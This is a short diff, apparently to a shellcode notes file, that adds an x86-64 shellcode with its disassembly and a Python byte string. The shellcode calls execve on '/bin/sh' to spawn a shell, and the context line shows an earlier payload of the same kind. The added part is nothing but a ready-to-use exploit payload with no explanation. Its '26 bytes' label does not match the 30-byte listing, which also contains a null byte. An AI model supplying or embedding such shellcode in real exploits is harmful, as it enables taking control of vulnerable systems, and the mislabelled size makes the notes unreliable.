@@ -76,4 +76,19 @@ shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x
 
 
 
+# 26 bytes
+0:  b0 3b                   mov    al,0x3b
+2:  48 31 f6                xor    rsi,rsi
+5:  48 31 d2                xor    rdx,rdx
+8:  48 8d 3d f8 ff ff ff    lea    rdi,[rip+0xfffffffffffffff8]        # 7 <_main+0x7>
+f:  48 b9 2f 62 69 6e 2f    movabs rcx,0x68732f6e69622f
+16: 73 68 00
+19: 48 89 0f                mov    QWORD PTR [rdi],rcx
+1c: 0f 05                   syscall
+
+shellcode = b"\xB0\x3B\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3D\xF8\xFF\xFF\xFF\x48\xB9\x2F\x62\x69\x6E\x2F\x73\x68\x00\x48\x89\x0F\x0F\x05"
+
+
+
+
 ```
